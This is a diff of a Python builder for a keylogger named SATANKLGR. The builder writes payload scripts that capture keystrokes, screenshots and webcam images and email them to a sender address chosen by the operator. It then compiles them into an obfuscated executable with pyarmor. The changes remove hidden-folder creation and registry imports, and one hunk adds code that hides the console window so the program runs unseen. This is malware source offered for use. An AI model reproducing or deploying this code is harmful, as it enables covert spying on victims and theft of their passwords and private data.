@@ -27,34 +27,26 @@ def agree():
 
 def pyw_exe():
     try:
-        print()
         print(Fore.YELLOW+"[*] Creating and writing to .py file...")
-        print()
         print(Fore.GREEN+"[*] Done √")
-        print()
         try:
             print(Fore.YELLOW+"[*] Compiling obfuscated .exe file...")
             print(Fore.RESET+"")
             os.system('pyarmor pack --clean -e "--onefile --icon default.ico" SATANKLGR.py')
-            print()
             print(Fore.GREEN+"[*] The file SATANKLGR.exe is successfully compiled and saved in dist folder √")
-            print()
             try:
                 print(Fore.YELLOW+"[*] Removing needless foulders...")
                 os.remove("SATANKLGR.py")
                 shutil.rmtree("build")
                 os.remove("SATANKLGR-patched.spec")
                 os.remove("SATANKLGR.spec")
-                print()
                 print(Fore.GREEN+"[*] Foulders are successfully removed √...")
-                print()
             except:
                 print(Fore.RED+"[*] Impossible to remove foulders")
         except:
             print(Fore.RED+"[*] Impossible to compile and obfuscate .py file")
     except:
         print(Fore.RED+"[*] Impossible to compile .py file")
-        print()
 
 def exception():
     print()
@@ -118,12 +110,10 @@ import os
 from cv2 import *
 from datetime import datetime
 import threading
-from winreg import *
 import ctypes
 from os import path
 
-directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
-ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)
+ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -210,7 +200,6 @@ keylogger.screenshot()
                 with open ('SATANKLGR.py', 'w') as f:
                     f.write(f'''import smtplib
 import threading
-from winreg import *
 from threading import Timer
 from datetime import datetime
 import keyboard
@@ -282,15 +271,11 @@ import os
 import keyboard
 from datetime import datetime
 import threading
-from winreg import *
 from multiprocessing import Process
 import ctypes
 from os import path
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
-
-directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
-ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -402,15 +387,11 @@ from cv2 import *
 import keyboard
 from datetime import datetime
 import threading
-from winreg import *
 from multiprocessing import Process
 import ctypes
 from os import path
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
-
-directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
-ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -546,14 +527,10 @@ from email.message import EmailMessage
 import pyautogui
 import os
 import threading
-from winreg import *
 import ctypes
 from os import path
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
-
-directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
-ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -610,16 +587,12 @@ import pyautogui
 import os
 import keyboard
 import threading
-from winreg import *
 from multiprocessing import Process
 import ctypes
 from datetime import datetime
 from os import path
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
-
-directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
-ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
@@ -719,14 +692,10 @@ from email.message import EmailMessage
 import os
 import cv2
 import threading
-from winreg import *
 import ctypes
 from os import path
 
 ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
-
-directory = os.mkdir(r"C:\\Users\\Public\\Public 3D Objects")
-ctypes.windll.kernel32.SetFileAttributesW(r"C:\\Users\\Public\\Public 3D Objects", 2)
 
 Sender_Email = '''+f'"{email1}"'+f'''
 Reciever_Email = Sender_Email
